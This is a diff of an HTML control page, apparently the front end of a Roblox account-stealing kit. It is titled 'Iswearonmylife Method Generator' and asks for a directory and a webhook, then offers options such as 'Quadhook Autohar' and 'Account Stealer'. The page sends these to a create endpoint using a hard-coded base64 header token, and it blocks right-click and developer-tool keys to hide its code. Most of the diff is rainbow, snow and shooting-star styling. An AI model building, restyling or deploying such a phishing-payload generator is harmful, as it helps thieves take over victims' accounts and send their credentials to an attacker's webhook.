@@ -1,103 +1,400 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <style>
-        body, html { background: rgb(24, 24, 28) !important; }
-    </style>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Create</title>
-    <!-- CSS / Bootstrap -->
-    <link href="/controlpage/css/imports.css?v=1742160749" rel="stylesheet">
-    <link href="/controlpage/css/config.css?v=1742160749&name=controlPage" rel="stylesheet">
-    <!-- SNACKBAR -->
-    <link rel="stylesheet" href="/controlPage/css/snackbar.css" />
-    <script src="/controlpage/js/snackbar.js"></script>
-    <style>
-        .swal2-container { z-index: 20000 !important; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+  <title>Create</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <style>
+    /* Fond noir global */
+    body, html {
+      background: #000 !important;
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: 'Inter', sans-serif;
+      overflow: hidden;
+    }
+    /* Appliquer une animation rainbow sur le texte et bordures */
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      animation: rainbowColor 15s linear infinite;
+      text-align: center;
+    }
+    @keyframes rainbowColor {
+      0%   { color: rgb(255,0,0); border-color: rgb(255,0,0); }
+      16%  { color: rgb(255,165,0); border-color: rgb(255,165,0); }
+      33%  { color: rgb(255,255,0); border-color: rgb(255,255,0); }
+      50%  { color: rgb(0,128,0); border-color: rgb(0,128,0); }
+      66%  { color: rgb(0,0,255); border-color: rgb(0,0,255); }
+      83%  { color: rgb(75,0,130); border-color: rgb(75,0,130); }
+      100% { color: rgb(238,130,238); border-color: rgb(238,130,238); }
+    }
+    /* Les canvases pour les effets (neige & shooting stars) */
+    #snowCanvas, #shootingStarCanvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 2;
+    }
+    /* Conteneur du formulaire placé devant (z-index inférieur) */
+    .form-container {
+      position: relative;
+      z-index: 1;
+    }
+    .form-box {
+      background-color: rgba(0, 0, 0, 0.8);
+      padding: 1.5rem;
+      border-radius: 0.5rem;
+      box-shadow: 0 4px 14px rgba(0,0,0,0.7);
+    }
+    /* Bouton avec dégradé animé RGB (rainbow) */
+    .gradient-button {
+      background: linear-gradient(45deg, rgb(255,0,0), rgb(255,165,0), rgb(255,255,0), rgb(0,128,0), rgb(0,0,255), rgb(75,0,130), rgb(238,130,238));
+      background-size: 400% 400%;
+      animation: rainbow 15s ease infinite;
+      border-radius: 0.375rem;
+      padding: 0.75rem 1.5rem;
+      font-size: 1.25rem;
+      font-weight: 600;
+      color: #000;
+      text-shadow: 0 0 10px rgba(255,255,255,0.5);
+      box-shadow: 0 0 10px rgba(255,0,0,0.5), 0 0 20px rgba(255,165,0,0.5);
+      transition: box-shadow 0.3s ease;
+    }
+    .gradient-button:hover {
+      box-shadow: 0 0 20px rgba(255,0,0,0.5), 0 0 30px rgba(255,165,0,0.5), 0 0 40px rgba(255,255,0,0.5);
+    }
+    @keyframes rainbow {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    /* Styles des inputs – on applique aussi l'animation sur les bordures et texte */
+    .gradient-input {
+      background: transparent;
+      border: 1px solid;
+      border-radius: 0.375rem;
+      padding: 0.75rem 1.5rem;
+      margin-bottom: 1rem;
+      animation: rainbowColor 15s linear infinite;
+    }
+    .gradient-input input,
+    .gradient-input select {
+      background: transparent;
+      border: none;
+      outline: none;
+      animation: rainbowColor 15s linear infinite;
+      width: 100%;
+    }
+    /* Pour le select et ses options : fond noir et texte animé */
+    select.form-control.gradient-input,
+    select.form-control.gradient-input option {
+      background-color: #000 !important;
+      animation: rainbowColor 15s linear infinite;
+    }
+    /* Spinner en RGB (exemple statique ici) */
+    .loading-spinner {
+      border: 4px solid rgba(255,0,0,0.3);
+      border-radius: 50%;
+      border-top: 4px solid rgb(255,0,0);
+      width: 24px;
+      height: 24px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    /* Notifications */
+    .notification {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background-color: #000;
+      padding: 15px 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+      z-index: 1000;
+      display: none;
+      animation: slideIn 0.5s ease-in-out forwards;
+    }
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateX(100%); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+    @keyframes slideOut {
+      from { opacity: 1; transform: translateX(0); }
+      to { opacity: 0; transform: translateX(100%); }
+    }
+    .notification.success { border-left: 5px solid rgb(255,0,0); }
+    .notification.error { border-left: 5px solid rgb(255,0,0); }
+    .notification .icon { font-size: 1.5rem; margin-right: 10px; }
+    .notification .close-btn {
+      position: absolute;
+      top : 10px;
+      right: 10px;
+      background: none;
+      border: none;
+      animation: rainbowColor 15s linear infinite;
+      font-size: 1.2rem;
+      cursor: pointer;
+    }
+    /* Animations de fade */
+    .fade-in { animation: fadeIn 0.5s ease-in-out forwards; }
+    .fade-out { animation: fadeOut 0.5s ease-in-out forwards; }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    @keyframes fadeOut {
+      from { opacity: 1; transform: scale(1); }
+      to { opacity: 0; transform: scale(0.9); }
+    }
+  </style>
 </head>
-
 <body>
-    <section id="login" name="regular" class="form">
-        <div class="container h-100">
-            <div class="row justify-content-center align-items-center h-100">
-                <div class="col-md-10 col-lg-5">
-                    <div class="login-box" data-aos="fade-up" data-aos-duration="1500">
-                        <center><h2>Method Generator</h2></center>
-                        <!-- LOGIN FORM -->
-                        <form method="post" id="login-form">
-                            <div class="form-input-icon mb-3 mt-4">
-                                <i class="fas fa-folder"></i>
-                                <input class="auth-input" type="text" placeholder="Directory Name" id="directory" required>
-                            </div>
-                            <div class="form-input-icon mb-3 mt-4">
-                                <i class="fas fa-gear"></i>
-                                <input class="auth-input" type="text" placeholder="Webhook" id="Webhook" required>
-                            </div>
-                            <div class="form-input-icon mb-3 mt-4" id="sname" style="display:none;">
-                                <i class="fas fa-signature"></i>
-                                <input class="auth-input" type="text" placeholder="Name here" name="sname">
-                            </div>
-                            <div class="form-input-icon mb-3 mt-4" id="sicon" style="display:none;">
-                                <i class="fas fa-image"></i>
-                                <input class="auth-input" type="text" placeholder="Thumbnail Here" name="sicon">
-                            </div>
-                            <div class="form-input-icon mb-3 mt-4" id="scolor" style="display:none;">
-                                <i class="fas fa-paintbrush" aria-hidden="true"></i>
-                                <input type="color" class="auth-input" name="scolor">
-                            </div>
-                            <select id="type" class="form-control" onchange="toggle()">
-                                <option value="quadhook">Quadhook Autohar (VERY, OP)</option>
-                                <option value="fb">Follow Bot (Autohar, Normal)</option>
-                                <option value="gc">Game Copier (Autohar, Normal)</option>
-                                <option value="cc">Clothing Copier (Autohar, Normal)</option>
-                                <option value="as">Account Stealer (Autohar, Normal)</option>
-                            </select>
-                            <button type="button" class="button primary d-block mt-3 w-100" onclick="Create(this);" style="color:black">Generate</button>
-                        </form>
-                        <!-- ~LOGIN FORM -->
-                    </div>
-                    <center>
-                        <button type="button" class="button primary d-block mt-3 w-80" onclick="window.location.replace('/controlpage/hyper-link');" style="color:black">
-                            <i class="fa-solid fa-repeat" style="color:black"></i> Hyperlink (LinkHider) Generator
-                        </button>
-                    </center>
-                </div>
-            </div>
-        </div>
-        <div class="overlay-top-right"></div>
-        <div class="overlay-bottom-right"></div>
-        <div class="overlay-bottom-left"></div>
-    </section>
-
-    <script src="../apis/main.js?v=1742160749"></script>
-    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <script src="../js/jquery-3.3.1.min.js"></script>
-    <script src="https://kit.fontawesome.com/44623006da.js" crossorigin="anonymous"></script>
-    <script src="../js/bootstrap.js"></script>
-    <script src="../js/core.js"></script>
-
-    <script>
-        function toggle() {
-            var type = document.getElementById("type").value;
-            var sname = document.getElementById("sname");
-            var sicon = document.getElementById("sicon");
-            var scolor = document.getElementById("scolor");
-
-            if (type === "quadhook") {
-                sname.style.display = "block";
-                sicon.style.display = "block";
-                scolor.style.display = "block";
-            } else {
-                sname.style.display = "none";
-                sicon.style.display = "none";
-                scolor.style.display = "none";
-            }
+  <!-- Canvases pour les effets (neige & shooting stars) -->
+  <canvas id="snowCanvas"></canvas>
+  <canvas id="shootingStarCanvas"></canvas>
+  
+  <!-- Conteneur du formulaire placé devant -->
+  <div class="form-container w-full max-w-lg p-6">
+    <h1 class="text-4xl font-bold text-center mb-4">Iswearonmylife Method Generator</h1>
+    <div class="form-box">
+      <div class="p-4 rounded shadow-lg transition duration-300">
+        <form method="post" id="login-form">
+          <div class="form-input-icon mb-3 mt-4">
+            <i class="fas fa-folder"></i>
+            <input class="auth-input gradient-input" type="text" placeholder="Directory Name" id="directory" required>
+          </div>
+          <div class="form-input-icon mb-3 mt-4">
+            <i class="fas fa-gear"></i>
+            <input class="auth-input gradient-input" type="text" placeholder="Webhook" id="Webhook" required>
+          </div>
+          <select id="type" class="form-control gradient-input" onchange="toggle()">
+            <option value="triplehook">Quadhook Autohar (VERY, OP)</option>
+            <option value="fb">Follow Bot (Autohar, Normal)</option>
+            <option value="gc">Game Copier (Autohar, Normal)</option>
+            <option value="cc">Clothing Copier (Autohar, Normal)</option>
+            <option value="as">Account Stealer (Autohar, Normal)</option>
+          </select>
+          <button type="button" class="gradient-button mt-3 w-full" onclick="Create(this);">
+            <i class="fas fa-user-plus"></i> Generate
+          </button>
+        </form>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Boîte de notification -->
+  <div id="notification" class="notification">
+    <button class="close-btn" onclick="closeNotification()">&times;</button>
+    <div id="notificationIcon" class="icon"></div>
+    <p id="notificationMessage"></p>
+  </div>
+  
+  <!-- Scripts -->
+  <script>
+    function toggle() {
+      // Logique pour afficher/cacher d'éventuels champs supplémentaires.
+    }
+    function showNotification(message, type) {
+      const notificationBox = document.getElementById('notification');
+      const notificationMessage = document.getElementById('notificationMessage');
+      const notificationIcon = document.getElementById('notificationIcon');
+      notificationMessage.textContent = message;
+      if (type === 'success') {
+        notificationBox.className = 'notification success';
+        notificationIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
+      } else if (type === 'error') {
+        notificationBox.className = 'notification error';
+        notificationIcon.innerHTML = '<i class="fas fa-times-circle"></i>';
+      }
+      notificationBox.style.display = 'block';
+      notificationBox.style.animation = 'slideIn 0.5s ease-in-out forwards';
+      setTimeout(() => { closeNotification(); }, 3000);
+    }
+    function closeNotification() {
+      const notificationBox = document.getElementById('notification');
+      notificationBox.style.animation = 'slideOut 0.5s ease-in-out forwards';
+      setTimeout(() => { notificationBox.style.display = 'none'; }, 500);
+    }
+    function Create(button) {
+      var directory = document.getElementById("directory").value;
+      var Webhook = document.getElementById("Webhook").value;
+      var type = document.getElementById("type").value;
+      if (!directory || !Webhook || !type) {
+        showNotification('You must fill out the form.', 'error');
+        return;
+      }
+      let url = `/Control page/apis/create?a=${encodeURIComponent(directory)}&b=${encodeURIComponent(Webhook)}&c=${encodeURIComponent(type)}`;
+      $.ajax({
+        url: url,
+        dataType: 'json',
+        headers: {
+          "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
+        },
+        beforeSend: function(){
+          button.disabled = true;
+          button.innerHTML = '<div class="loading-spinner"></div>';
+        },
+        error: function(data){
+          showNotification(`${data.responseJSON['errors'][0]['message']}`, 'error');
+        },
+        complete: function(){
+          button.disabled = false;
+          button.innerHTML = '<i class="fas fa-user-plus"></i> Generate';
+        },
+        success: function(data){
+          if(data['success'] === true){
+            showNotification('Check Your Webhook', 'success');
+          } else {
+            showNotification(`${data['errors'][0]['message']}`, 'error');
+          }
         }
+      });
+    }
+    window.onload = function() { toggle(); };
 
-        window.onload = toggle;
-    </script>
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+      showNotification('Action not allowed', 'error');
+    });
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) {
+        e.preventDefault();
+        showNotification('Action not allowed', 'error');
+      }
+    });
+    document.addEventListener('keydown', function(e) {
+      if (e.ctrlKey && e.key === 'u') {
+        e.preventDefault();
+        showNotification('Action not allowed', 'error');
+      }
+    });
+  </script>
+  
+  <!-- Script pour l'effet Shooting Stars en RGB animé -->
+  <script>
+    (function(){
+      const canvas = document.getElementById("shootingStarCanvas");
+      const ctx = canvas.getContext("2d");
+      let width = canvas.width = window.innerWidth;
+      let height = canvas.height = window.innerHeight;
+      let shootingStars = [];
+      function createShootingStar() {
+        return {
+          x: Math.random() * width,
+          y: 0,
+          length: Math.random() * 80 + 10,
+          speed: Math.random() * 2 + 0.5,
+          opacity: Math.random() * 0.5 + 0.5
+        };
+      }
+      function animateShootingStars() {
+        ctx.clearRect(0, 0, width, height);
+        if (Math.random() < 0.01) {
+          shootingStars.push(createShootingStar());
+        }
+        let hue = (performance.now() / 15) % 360;
+        for (let i = shootingStars.length - 1; i >= 0; i--) {
+          let star = shootingStars[i];
+          star.x += star.speed;
+          star.y += star.speed;
+          star.opacity -= 0.002;
+          ctx.beginPath();
+          ctx.moveTo(star.x, star.y);
+          ctx.lineTo(star.x - star.length, star.y - star.length);
+          ctx.strokeStyle = `hsla(${hue}, 100%, 50%, ${star.opacity})`;
+          ctx.lineWidth = 2;
+          ctx.stroke();
+          if (star.x > width || star.y > height || star.opacity <= 0) {
+            shootingStars.splice(i, 1);
+          }
+        }
+        requestAnimationFrame(animateShootingStars);
+      }
+      animateShootingStars();
+      window.addEventListener("resize", function(){
+        width = canvas.width = window.innerWidth;
+        height = canvas.height = window.innerHeight;
+      });
+    })();
+  </script>
+  
+  <!-- Script pour l'effet Snowflakes en RGB animé -->
+  <script>
+    (function(){
+      const canvas = document.getElementById("snowCanvas");
+      const ctx = canvas.getContext("2d");
+      let width = canvas.width = window.innerWidth;
+      let height = canvas.height = window.innerHeight;
+      let snowflakes = [];
+      const number = 100;
+      for (let i = 0; i < number; i++){
+          snowflakes.push({
+              x: Math.random() * width,
+              y: Math.random() * height,
+              radius: Math.random() * 4 + 1,
+              density: Math.random() * number
+          });
+      }
+      let angle = 0;
+      function drawSnowflakes(){
+          ctx.clearRect(0, 0, width, height);
+          let hue = (performance.now() / 15) % 360;
+          ctx.fillStyle = `hsla(${hue}, 100%, 50%, 0 .8)`;
+          ctx.beginPath();
+          for (let i = 0; i < number; i++){
+              let f = snowflakes[i];
+              ctx.moveTo(f.x, f.y);
+              ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2, true);
+          }
+          ctx.fill();
+          updateSnowflakes();
+      }
+      function updateSnowflakes(){
+          angle += 0.005;
+          for (let i = 0; i < number; i++){
+              let f = snowflakes[i];
+              f.y += Math.cos(angle + f.density) + 0.5 + f.radius / 4;
+              f.x += Math.sin(angle) * 0.5;
+              if (f.x > width + 5 || f.x < -5 || f.y > height) {
+                  if (i % 3 > 0) {
+                      snowflakes[i] = { x: Math.random() * width, y: -10, radius: f.radius, density: f.density };
+                  } else {
+                      if (Math.sin(angle) > 0) {
+                          snowflakes[i] = { x: -5, y: Math.random() * height, radius: f.radius, density: f.density };
+                      } else {
+                          snowflakes[i] = { x: width + 5, y: Math.random() * height, radius: f.radius, density: f.density };
+                      }
+                  }
+              }
+          }
+      }
+      setInterval(drawSnowflakes, 33);
+      window.addEventListener("resize", function(){
+          width = canvas.width = window.innerWidth;
+          height = canvas.height = window.innerHeight;
+      });
+    })();
+  </script>
+  
+  <script src="https://kit.fontawesome.com/44623006da.js" crossorigin="anonymous"></script>
+  <script src="/Controlpage/apis/main.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script src="/Controlpage/js/jquery-3.3.1.min.js"></script>
+  <script src="/Controlpage/new/assets/js/bootstrap.js"></script>
+  <script src="/Controlpage/new/assets/js/core.js"></script>
 </body>
 </html>
